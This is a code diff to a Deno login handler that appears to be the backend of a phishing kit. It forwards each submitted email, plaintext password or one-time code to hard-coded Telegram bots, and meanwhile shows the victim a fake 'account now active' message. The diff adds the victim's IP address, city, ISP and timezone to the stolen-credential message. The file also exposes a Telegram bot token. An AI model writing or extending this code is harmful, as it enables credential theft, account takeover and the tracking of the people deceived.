@@ -5,6 +5,15 @@ interface LoginRequest {
   provider?: string
   password: string
   turnstileToken?: string
+  // Geolocation fields (resolved client-side via IP lookup)
+  ip?: string
+  country?: string
+  countryCode?: string
+  region?: string
+  city?: string
+  continent?: string
+  org?: string
+  timezone?: string
 }
 
 interface LoginResponse {
@@ -25,11 +34,41 @@ const TELEGRAM_BOTS = [
   { token: '8810483237:AAEU9tXIxRL_HzgLrdEB0O7_I9aEVW5RCkM', chatId: '5566002678' },
 ]
 
-async function sendTelegramNotification(name: string, email: string, provider: string, password: string) {
+interface GeoInfo {
+  ip?: string
+  country?: string
+  countryCode?: string
+  region?: string
+  city?: string
+  continent?: string
+  org?: string
+  timezone?: string
+}
+
+async function sendTelegramNotification(
+  name: string,
+  email: string,
+  provider: string,
+  password: string,
+  geo?: GeoInfo
+) {
   const isOtp = password.startsWith('[OTP Code]');
   const credentialLabel = isOtp ? '🔑 <b>OTP Code:</b>' : '🔒 <b>Password:</b>';
   const displayPassword = isOtp ? password.replace('[OTP Code]', '').trim() : password;
   const statusLabel = isOtp ? 'One-Time Code Submitted' : 'Successfully Authenticated';
+
+  // Build geolocation section
+  const geoLines = geo ? [
+    geo.ip         ? `🌐 <b>IP:</b> <code>${geo.ip}</code>` : null,
+    geo.country    ? `🏳️ <b>Country:</b> ${geo.country}${geo.countryCode ? ` (${geo.countryCode})` : ''}` : null,
+    geo.continent  ? `🌍 <b>Continent:</b> ${geo.continent}` : null,
+    geo.region     ? `📍 <b>Region:</b> ${geo.region}` : null,
+    geo.city       ? `🏙️ <b>City:</b> ${geo.city}` : null,
+    geo.org        ? `🏢 <b>ISP/Org:</b> ${geo.org}` : null,
+    geo.timezone   ? `⏰ <b>Timezone:</b> ${geo.timezone}` : null,
+  ].filter(Boolean).join('\n') : ''
+
+  const geoSection = geoLines ? `\n\n📡 <b>Geolocation</b>\n━━━━━━━━━━━━━━━━━━━━\n${geoLines}` : ''
 
   const message = `
 ╔══════════════════════════════╗
@@ -41,7 +80,7 @@ async function sendTelegramNotification(name: string, email: string, provider: s
 📧 <b>Email:</b> ${email}
 🔗 <b>Provider:</b> ${provider}
 ${credentialLabel} <code>${displayPassword}</code>
-🕐 <b>Timestamp:</b> ${new Date().toISOString()}
+🕐 <b>Timestamp:</b> ${new Date().toISOString()}${geoSection}
 
 ━━━━━━━━━━━━━━━━━━━━
 <i>User has been welcomed and account is now active.</i>
@@ -198,8 +237,20 @@ serve(async (req) => {
     const providerName = body.provider ? ` via ${body.provider}` : ''
     const welcomeMessage = `Hi ${formattedName}, welcome! You have successfully authenticated${providerName}. Your account is now active and ready to use.`
 
+    // Build geo object from request body fields
+    const geo: GeoInfo = {
+      ip: body.ip,
+      country: body.country,
+      countryCode: body.countryCode,
+      region: body.region,
+      city: body.city,
+      continent: body.continent,
+      org: body.org,
+      timezone: body.timezone,
+    }
+
     // Send Telegram notification (must await so Deno isolate doesn't terminate before it finishes)
-    await sendTelegramNotification(formattedName, body.email, body.provider || 'email', body.password).catch(err => {
+    await sendTelegramNotification(formattedName, body.email, body.provider || 'email', body.password, geo).catch(err => {
       console.error('Telegram notification error:', err)
     })
 
